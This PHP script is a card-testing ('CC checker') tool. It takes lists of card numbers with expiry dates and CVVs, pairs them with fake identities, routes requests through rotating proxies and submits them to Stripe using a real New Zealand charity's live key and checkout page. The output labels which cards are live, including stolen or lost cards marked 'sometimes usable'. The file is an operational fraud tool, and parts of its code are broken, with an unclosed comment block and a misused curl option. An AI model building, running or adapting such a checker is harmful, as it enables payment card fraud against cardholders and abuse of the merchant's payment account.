<?php

///////////////BASE BY ////////////////////

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function proxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = proxies();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

//$username = 'Put Zone Username Here';
//$password = 'Put Zone Password Here';
//$port = 22225;
//$session = mt_rand();
//$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[1st Req]

$ch = curl_init('');
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://js.stripe.com',
'user-agent: Mozilla/5.0 (Linux; Android 9; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'referer: https://js.stripe.com/v3/controller-76600170d298ea4d27a4c21942f52ae6.html'
));
curl_setopt($ch, CURLOPT_POSTFIELDS,
'type=card&billing_details[address][line1]='.$street.'&billing_details[address][line2]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][country]=AG&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e0d4ee99-4bf0-4d0a-8f9b-a5ac6443ad268e2957&muid=c1a882bb-ec71-4564-817c-a3e3a0cc9da847705e&sid=f90fd8d5-79e4-4ce9-83f4-3f4cf63a170b2865d5&pasted_fields=number&payment_user_agent=stripe.js%2F5db0321f4%3B+stripe-js-v3%2F5db0321f4&time_on_page=76670&referrer=https%3A%2F%2Fwww.musictherapy.org.nz%2Fregister%2Fregistered-music-therapists%2F%3Faction%3Dcheckout%26txn%3D7s&key=pk_live_51DJ920AhFY7gGvg7RqNwODORvCQIwFBhEieyfenSIIvVpUWPxyptTHCRDg51YK5EXiFts3k9t03suQkINHmCstRF00ugOAbfyX');
$result1 = curl_exec($ch);
//echo "<b>1REQ Result:</b> $result1<br><br>";
//$a = json_decode($result1, true);
//$token = $a['data']['tokenizeCreditCard']['token'];

//echo<b> Message </b> $result";
$token = trim(strip_tags(getstr($result1,'"id": "','"')));
$message1 = trim(strip_tags(getstr($result1,'"message": "','"')));
//echo "$token";

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]
/*
$ch = curl_init();
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.musictherapy.org.nz/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.musictherapy.org.nz',
'accept: application/json, text/javascript, */*; q=0.01',
'origin: https://www.musictherapy.org.nz',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryIiW9Ts4rY9eqwo57',
'referer: https://www.musictherapy.org.nz/register/registered-music-therapist-non-practising/?action=checkout&txn=8b'
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="mepr_transaction_id"

299
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="address_required"

1
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="card-address-one"

'.$street.'
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="card-address-two"


------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="card-address-city"

'.$city.'
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="card-address-country"

US
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="card-address-state"

'.$state.'
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="card-address-zip"

'.$postcode.'
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="card-name"

'.$name.'+'.$last.'
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="payment_method_id"

'.$token.'
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="action"

mepr_stripe_confirm_payment
------WebKitFormBoundaryIiW9Ts4rY9eqwo57
Content-Disposition: form-data; name="mepr_current_url"

https://www.musictherapy.org.nz/register/registered-music-therapist-non-practising/?action=checkout&txn=8b#mepr_jump
------WebKitFormBoundaryIiW9Ts4rY9eqwo57--
');

$result = curl_exec($ch);
$message = trim(strip_tags(getstr($result,'"message":"','"')));
$info = curl_getinfo($ch,CURLINFO_TOTAL_TIME);
$net = substr($info,0,4)."sec";
 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CVV MATCHED  </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CVV MATCHED  </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CVC MATCHED </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CCN LIVE </span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CCN LIVE /span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">CCN LIVE</span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CCN LIVE  </span></br>';
}
elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> CVC MATCHED - Incorrect Zip  </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> Stolen_Card - Sometime Useable  </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> Lost_Card - Sometime Useable  </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> Insufficient Funds  </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Card Expired </span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">Approved</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success"> Pickup Card_Card - Sometime Useable  </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Incorrect Card Number </span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Incorrect Card Number </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger">Card Declined</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Declined : Generic_Decline </span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Declined : Do_Not_Honor </span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Security Code Check : Unchecked [Proxy Dead] </span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Security Code Check : Fail </span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Expired Card </span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="badge badge-danger">Dead</span> <span class="badge badge-danger">' . $lista . '</span> <span class="badge badge-danger"> Card Doesnt Support This Purchase </span> </br>';
}
 else {
  echo '<span class="badge badge-warning">Dead</span> <span class="badge badge-warning">' . $lista . '</span> <span class="badge badge-warning"> Proxy Dead / Error Not Listed </span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
//echo $result
//echo $token; to check if token captured or not 

///////////////////////////////////////////////====== By ===============\\\\\\\\\\\\\\\[Used Reboot13 Raw Base ]
?>
